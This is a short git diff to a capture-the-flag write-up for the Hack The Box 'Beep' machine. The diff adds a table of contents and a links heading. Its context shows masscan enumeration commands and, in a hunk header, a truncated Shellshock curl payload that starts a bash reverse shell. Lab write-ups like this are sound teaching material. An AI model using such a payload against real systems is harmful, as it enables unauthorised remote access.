@@ -11,6 +11,13 @@
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/51e51aef-3dea-4378-92af-413d244fe65b)
 
 
+# Sections
++ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/06_Beep.md#enumeration)
++ [Gainin Access](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/06_Beep.md#method-1)
++ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/06_Beep.md#privilege-escalation)
++ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/06_Beep.md#links)
+
+
 ## Enumeration
 + `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.7 -e tun0 > ports`
 + `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
@@ -253,6 +260,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/819decc1-3fb6-4d95-8915-6df5306f1a9f)
 
 
+# Links
 
 # References & Alternatives
 + https://vvmlist.github.io/#beep
